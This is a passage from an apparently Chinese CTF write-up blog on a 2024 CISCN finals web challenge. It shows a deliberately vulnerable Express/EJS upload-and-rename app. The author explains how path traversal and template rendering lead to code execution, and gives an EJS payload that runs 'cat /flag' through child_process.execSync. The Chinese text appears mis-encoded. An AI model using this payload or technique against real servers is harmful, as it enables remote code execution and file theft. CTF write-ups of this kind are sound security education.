punctuation">.</span><span class="token function">diskStorage</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token function-variable function">destination</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// è®¾ç½®ä¸Šä¼ æ–‡ä»¶çš„ç›®æ ‡ç›®å½•</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token function-variable function">filename</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// ç›´æ¥ä½¿ç”¨åŸå§‹æ–‡ä»¶å</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// é…ç½® multer ä¸Šä¼ ä¸­é—´ä»¶</span><span class="token keyword">const</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">storage</span><span class="token operator">:</span> storage<span class="token punctuation">,</span> <span class="token comment">// ä½¿ç”¨è‡ªå®šä¹‰å­˜å‚¨é€‰é¡¹</span>    <span class="token function-variable function">fileFilter</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// å¦‚æœæ–‡ä»¶åç¼€ä¸º .ejsï¼Œåˆ™æ‹’ç»ä¸Šä¼ è¯¥æ–‡ä»¶</span>            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å…è®¸ä¸Šä¼ å…¶ä»–ç±»å‹çš„æ–‡ä»¶</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>admin<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string-property property">"username"</span><span class="token operator">:</span><span class="token string">"ADMIN"</span><span class="token punctuation">,</span>    <span class="token string-property property">"password"</span><span class="token operator">:</span><span class="token string">"123456"</span><span class="token punctuation">&#125;</span>app<span class="token operator">=</span><span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>express<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParse<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token string">'Can_U_hack_me?'</span><span class="token punctuation">,</span>    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token literal-property property">cookie</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">maxAge</span><span class="token operator">:</span> <span class="token number">3600</span> <span class="token operator">*</span> <span class="token number">1000</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span>res</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> username<span class="token punctuation">,</span> password <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'you can not be admin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> new_username <span class="token operator">=</span> username<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>new_username <span class="token operator">===</span> admin<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> admin<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token string">"ADMIN"</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// res.redirect('/login');</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'upload'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/upload'</span><span class="token punctuation">,</span> upload<span class="token punctuation">.</span><span class="token function">single</span><span class="token punctuation">(</span><span class="token string">'fileInput'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>file<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No file uploaded'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File uploaded successfully: '</span> <span class="token operator">+</span> req<span class="token punctuation">.</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/render'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> filename <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Filename parameter is required'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> filePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>filePath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'.ejs'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file type.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span>filePath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/rename'</span><span class="token punctuation">,</span>IfLogin<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user <span class="token operator">!==</span> <span class="token string">'ADMIN'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Access forbidden'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> oldPath <span class="token punctuation">,</span> newPath <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldPath <span class="token operator">||</span> <span class="token operator">!</span>newPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Missing oldPath or newPath'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">app\.js|\\|\.ejs</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>oldPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.|flag</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>oldPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">const</span> new_file <span class="token operator">=</span> newPath<span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> oldFilePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> oldPath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> newFilePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'uploads'</span><span class="token punctuation">,</span> new_file<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>newFilePath<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">'.ejs'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file type.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>oldPath<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'oldPath parameter is required'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>oldFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Old file not found'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>newFilePath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">409</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'New file path already exists'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">createDirectoriesForFilePath</span><span class="token punctuation">(</span>newFilePath<span class="token punctuation">)</span>    fs<span class="token punctuation">.</span><span class="token function">rename</span><span class="token punctuation">(</span>oldFilePath<span class="token punctuation">,</span> newFilePath<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Error renaming file:'</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Error renaming file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'File renamed successfully'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token string">'3000'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://localhost:3000</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>package.json</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"express-file-upload-app"</span><span class="token punctuation">,</span>  <span class="token property">"version"</span><span class="token operator">:</span> <span class="token string">"1.0.0"</span><span class="token punctuation">,</span>  <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"ezjs"</span><span class="token punctuation">,</span>  <span class="token property">"main"</span><span class="token operator">:</span> <span class="token string">"app.js"</span><span class="token punctuation">,</span>  <span class="token property">"scripts"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"start"</span><span class="token operator">:</span> <span class="token string">"node app.js"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"dependencies"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"express"</span><span class="token operator">:</span> <span class="token string">"^4.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"ejs"</span><span class="token operator">:</span> <span class="token string">"^3.1.6"</span><span class="token punctuation">,</span>    <span class="token property">"express-session"</span><span class="token operator">:</span> <span class="token string">"^1.17.2"</span><span class="token punctuation">,</span>    <span class="token property">"body-parser"</span><span class="token operator">:</span> <span class="token string">"^1.19.0"</span><span class="token punctuation">,</span>    <span class="token property">"multer"</span><span class="token operator">:</span> <span class="token string">"^1.4.4"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ejs v3.1.6ï¼Œä½†æ˜¯çœ‹äº†ä¸‹<code>render</code>æ²¡æœ‰å‚æ•°å¯æ§</p><p>æ¥ä¸‹æ¥è€ƒè™‘expresså¼•æ“è§£æçš„æ¼æ´ï¼Œå‚è€ƒï¼š<a href="https://xz.aliyun.com/t/13512">https://xz.aliyun.com/t/13512</a></p><p>ä¸Šä¼ index.js</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112355986.png" alt="image-20240720112355986"></p><p>ç„¶åç›®å½•ç©¿è¶Šç§»åŠ¨åˆ°node_modulesä¸‹</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112416310.png" alt="image-20240720112416310"></p><p>æ¥ä¸‹æ¥å†ä¸Šä¼ ä¸€ä¸ª.tttåç¼€çš„æ–‡ä»¶</p><p>æ¥ä¸‹æ¥&#x2F;renderè·¯ç”±å…ˆæ¸²æŸ“1.tttï¼Œå†æ¸²æŸ“1.ejså³å¯å¸¦å‡ºå›æ˜¾</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112540877.png" alt="image-20240720112540877"></p><p>ç„¶åæ¢ä¸€ä¸ªåç¼€æ•…æŠ€é‡æ–½å³å¯</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112948693.png" alt="image-20240720112948693"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240720112927334.png" alt="image-20240720112927334"></p><hr><h3 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h3><p>æ¥è‡ª<a href="https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3">https://1llustrious.github.io/2024/07/25/CISCN%E4%B9%8B%E6%97%85/#%E5%9B%BD%E5%86%B3</a></p><p>.ejs ç»•è¿‡æ–‡ä»¶ä¸Šä¼ </p><p>render ä¼ å‚ .ejs&#x2F;â€¦&#x2F; ç»•è¿‡ render æ£€éªŒ</p><pre class="line-numbers language-ejs" data-language="ejs"><code class="language-ejs"><span class="token ejs language-ejs"><span class="token delimiter punctuation">&lt;%=</span><span class="token language-javascript"> global<span class="token punctuation">.</span>process<span class="token punctuation">.</span>mainModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'child_process'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">'cat /flag'</span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">%></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="fix"><a href="#fix" class="headerlink" title="fix"></a>fix</h3><p>åŠ ä¸€ä¸‹ä¸­é—´ä»¶å’Œé‡å‘½åçš„è·¯å¾„åç§°é»‘åå•å³å¯ï¼Œåº”è¯¥åªéœ€è¦è¿‡æ»¤ä¸Šä¼ jså³å¯ï¼Œæ„Ÿè§‰æ˜¯è¿™ä¹ˆæŠ¢è¡€çš„</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// é…ç½® multer ä¸Šä¼ ä¸­é—´ä»¶</span><span class="token keyword">const</span> upload <span class="token operator">=</span> <span class="token function">multer</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">storage</span><span class="token operator">:</span> storage<span class="token punctuation">,</span> <span class="token comment">// ä½¿ç”¨è‡ªå®šä¹‰å­˜å‚¨é€‰é¡¹</span>    <span class="token function-variable function">fileFilter</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> file<span class="token punctuation">,</span> cb</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> fileExt <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>file<span class="token punctuation">.</span>originalname<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.ejs'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// å¦‚æœæ–‡ä»¶åç¼€ä¸º .ejsï¼Œåˆ™æ‹’ç»ä¸Šä¼ è¯¥æ–‡ä»¶</span>            <span class="token 